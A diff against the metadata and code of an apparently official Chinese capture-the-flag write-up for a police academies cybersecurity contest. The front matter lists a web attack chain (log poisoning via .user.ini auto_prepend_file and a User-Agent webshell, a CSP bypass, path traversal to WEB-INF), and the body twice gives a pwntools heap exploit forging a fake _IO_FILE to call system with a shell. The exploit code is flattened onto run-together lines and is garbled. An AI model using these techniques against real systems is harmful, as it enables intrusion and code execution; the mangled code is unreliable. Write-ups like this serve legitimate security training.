@@ -12,7 +12,15 @@ tags:
 - JSP welcome泄露
 - 路径穿越/WEB-INF
 - 帆软FineReport反序列化
-attack_chain: 1.奶龙:未过滤.user.ini→auto_prepend_file=/var/log/nginx/access.log→UA头写马→2.外国山海经:CSP绕过用1000+参数触发Warning+header失败→XSS→3.Message Board:welcome.jsp泄露isValidUser逻辑→m1xian_a注册改m1xian密码→/fileload+路径穿越/WEB-INF
+attack_chain:
+- '1.奶龙:未过滤.user.ini'
+- 'auto_prepend_file=/var/log/nginx/access.log'
+- 'UA头写马'
+- '2.外国山海经:CSP绕过用1000+参数触发Warning+header失败'
+- 'XSS'
+- '3.Message Board:welcome.jsp泄露isValidUser逻辑'
+- 'm1xian_a注册改m1xian密码'
+- '/fileload+路径穿越/WEB-INF'
 key_payload: auto_prepend_file=/var/log/nginx/access.log;UA头写马;max_input_vars=1000;CSP bypass;isValidUser('username_password.txt');username=m1xian_a 改密码;/fileload文件上传
 one_liner: 第三届黄河流域公安院校挑战赛官方WP：.user.ini包含+CSP绕过XSS+JSP文件包含+路径穿越
 lesson: .user.ini可作为LFI目标；max_input_vars=1000触发Warning致header失败可绕过CSP
@@ -59,6 +67,9 @@ prerequisites:
 - CSP 头与 PHP Warning header() 失败的交互
 - Jetty Configure XML + BCEL 字节码加载
 - Linux Capabilities 提权（setuid capability）
+contest_normalized: "第三届黄河流域公安院校网络空间安全技能挑战赛"
+contest_year: 2024
+subcategory_guess: "lfi"
 ---
 # 第三届黄河流域公安院校网络空间安全技能挑战赛官方Writeup
 
@@ -296,8 +307,8 @@ from pwn import *  context(os='linux', arch='amd64', log_level='debug')  #r
 def exit():    cmd(113023)
 add(0xf8,b'aaaa')  #  0add(0x468,b'bbbb')  # 1add(0xf8,b'cccc')
 #    2add(0x18,b'eeee') #   3add(0x550,b'dddd')
-#   4add(0x10,b'protect') #prevent chunk   5delete(0) edit(1,b'x00'*0x460 + p64(0x470 + 0x100))delete(2)add(0xf8,b'aaaa')add(0xb00,b'rrrr') printf(1)r.recvuntil(b'nt:n')large =  u64(r.recv(6).ljust(8, b' '))libc_base = large - 0x3c4fb8success('libc_base:' +hex(libc_base)) _IO_list_all = libc_base + libc.sym['_IO_list_all']io_wfile_jumps = libc_base + libc.sym['_IO_wfile_jumps']system = libc_base + libc.sym['system']edit(1,b'a'*0x10 + b'b') printf(1)r.recvuntil(b'aaaaaaaaaaaaaaaa')chunk_addr =  u64(r.recv(6).ljust(8, b' ')) -0x62success('chunk_addr:' +hex(chunk_addr))
-delete(4) edit(1,p64(large) + p64(large) + p64(0) + p64(_IO_list_all-0x20))add(0x1000,b'large2')#4 -- > largeedit(0,b'A' * 0xf0 + p32(0xfffff7f5) + b';shx00')fake_io_file = p64(0)*2 + p64(1) + p64(2)fake_io_file = fake_io_file.ljust(    0xa0 - 0x10, b' ') + p64(chunk_addr + 0x100)  # _wide_datafake_io_file = fake_io_file.ljust(    0xc0 - 0x10, b' ') + p64(0xffffffffffffffff)  # _modefake_io_file = fake_io_file.ljust(    0xd8 - 0x10, b' ') + p64(io_wfile_jumps)  # vtablefake_io_file = fake_io_file.ljust(    0x100 - 0x10 + 0x130, b' ') + p64(chunk_addr + 0x200)fake_io_file = fake_io_file.ljust(    0x200 - 0x10, b' ') + p64(0)*6 + p64(system)add(0x550,b'tttt')edit(1,fake_io_file)exit()r.interactive()
+#   4add(0x10,b'protect') #prevent chunk   5delete(0) edit(1,b'x00'*0x460 + p64(0x470 + 0x100))delete(2)add(0xf8,b'aaaa')add(0xb00,b'rrrr') printf(1)r.recvuntil(b'nt:n')large =  u64(r.recv(6).ljust(8, b'\\x00'))libc_base = large - 0x3c4fb8success('libc_base:' +hex(libc_base)) _IO_list_all = libc_base + libc.sym['_IO_list_all']io_wfile_jumps = libc_base + libc.sym['_IO_wfile_jumps']system = libc_base + libc.sym['system']edit(1,b'a'*0x10 + b'b') printf(1)r.recvuntil(b'aaaaaaaaaaaaaaaa')chunk_addr =  u64(r.recv(6).ljust(8, b'\\x00')) -0x62success('chunk_addr:' +hex(chunk_addr))
+delete(4) edit(1,p64(large) + p64(large) + p64(0) + p64(_IO_list_all-0x20))add(0x1000,b'large2')#4 -- > largeedit(0,b'A' * 0xf0 + p32(0xfffff7f5) + b';shx00')fake_io_file = p64(0)*2 + p64(1) + p64(2)fake_io_file = fake_io_file.ljust(    0xa0 - 0x10, b'\\x00') + p64(chunk_addr + 0x100)  # _wide_datafake_io_file = fake_io_file.ljust(    0xc0 - 0x10, b'\\x00') + p64(0xffffffffffffffff)  # _modefake_io_file = fake_io_file.ljust(    0xd8 - 0x10, b'\\x00') + p64(io_wfile_jumps)  # vtablefake_io_file = fake_io_file.ljust(    0x100 - 0x10 + 0x130, b'\\x00') + p64(chunk_addr + 0x200)fake_io_file = fake_io_file.ljust(    0x200 - 0x10, b'\\x00') + p64(0)*6 + p64(system)add(0x550,b'tttt')edit(1,fake_io_file)exit()r.interactive()
 
 REVERSE
 
@@ -679,8 +690,8 @@ from pwn import *  context(os='linux', arch='amd64', log_level='debug')  #r
 def exit():    cmd(113023)
 add(0xf8,b'aaaa')  #  0add(0x468,b'bbbb')  # 1add(0xf8,b'cccc')
 #    2add(0x18,b'eeee') #   3add(0x550,b'dddd')
-#   4add(0x10,b'protect') #prevent chunk   5delete(0) edit(1,b'x00'*0x460 + p64(0x470 + 0x100))delete(2)add(0xf8,b'aaaa')add(0xb00,b'rrrr') printf(1)r.recvuntil(b'nt:n')large =  u64(r.recv(6).ljust(8, b' '))libc_base = large - 0x3c4fb8success('libc_base:' +hex(libc_base)) _IO_list_all = libc_base + libc.sym['_IO_list_all']io_wfile_jumps = libc_base + libc.sym['_IO_wfile_jumps']system = libc_base + libc.sym['system']edit(1,b'a'*0x10 + b'b') printf(1)r.recvuntil(b'aaaaaaaaaaaaaaaa')chunk_addr =  u64(r.recv(6).ljust(8, b' ')) -0x62success('chunk_addr:' +hex(chunk_addr))
-delete(4) edit(1,p64(large) + p64(large) + p64(0) + p64(_IO_list_all-0x20))add(0x1000,b'large2')#4 -- > largeedit(0,b'A' * 0xf0 + p32(0xfffff7f5) + b';shx00')fake_io_file = p64(0)*2 + p64(1) + p64(2)fake_io_file = fake_io_file.ljust(    0xa0 - 0x10, b' ') + p64(chunk_addr + 0x100)  # _wide_datafake_io_file = fake_io_file.ljust(    0xc0 - 0x10, b' ') + p64(0xffffffffffffffff)  # _modefake_io_file = fake_io_file.ljust(    0xd8 - 0x10, b' ') + p64(io_wfile_jumps)  # vtablefake_io_file = fake_io_file.ljust(    0x100 - 0x10 + 0x130, b' ') + p64(chunk_addr + 0x200)fake_io_file = fake_io_file.ljust(    0x200 - 0x10, b' ') + p64(0)*6 + p64(system)add(0x550,b'tttt')edit(1,fake_io_file)exit()r.interactive()
+#   4add(0x10,b'protect') #prevent chunk   5delete(0) edit(1,b'x00'*0x460 + p64(0x470 + 0x100))delete(2)add(0xf8,b'aaaa')add(0xb00,b'rrrr') printf(1)r.recvuntil(b'nt:n')large =  u64(r.recv(6).ljust(8, b'\\x00'))libc_base = large - 0x3c4fb8success('libc_base:' +hex(libc_base)) _IO_list_all = libc_base + libc.sym['_IO_list_all']io_wfile_jumps = libc_base + libc.sym['_IO_wfile_jumps']system = libc_base + libc.sym['system']edit(1,b'a'*0x10 + b'b') printf(1)r.recvuntil(b'aaaaaaaaaaaaaaaa')chunk_addr =  u64(r.recv(6).ljust(8, b'\\x00')) -0x62success('chunk_addr:' +hex(chunk_addr))
+delete(4) edit(1,p64(large) + p64(large) + p64(0) + p64(_IO_list_all-0x20))add(0x1000,b'large2')#4 -- > largeedit(0,b'A' * 0xf0 + p32(0xfffff7f5) + b';shx00')fake_io_file = p64(0)*2 + p64(1) + p64(2)fake_io_file = fake_io_file.ljust(    0xa0 - 0x10, b'\\x00') + p64(chunk_addr + 0x100)  # _wide_datafake_io_file = fake_io_file.ljust(    0xc0 - 0x10, b'\\x00') + p64(0xffffffffffffffff)  # _modefake_io_file = fake_io_file.ljust(    0xd8 - 0x10, b'\\x00') + p64(io_wfile_jumps)  # vtablefake_io_file = fake_io_file.ljust(    0x100 - 0x10 + 0x130, b'\\x00') + p64(chunk_addr + 0x200)fake_io_file = fake_io_file.ljust(    0x200 - 0x10, b'\\x00') + p64(0)*6 + p64(system)add(0x550,b'tttt')edit(1,fake_io_file)exit()r.interactive()
 def convert_hex_to_bin(input_file, output_file):    """    将包含十六进制字符串的文本文件转换为二进制文件    :
 param input_file: 输入文本文件路径    :
 param output_file: 输出二进制文件路径    """    try:        with open(input_file, 'r') as f:            hex_str = f.read().replace('n', ' ').split()                # 将十六进制字符串转换为字节数组        byte_data = bytes.fromhex(''.join(hex_str))                with open(output_file, 'wb') as f:            f.write(byte_data)                    print(f"成功转换并写入 {len(byte_data)} 字节到 {output_file}")        
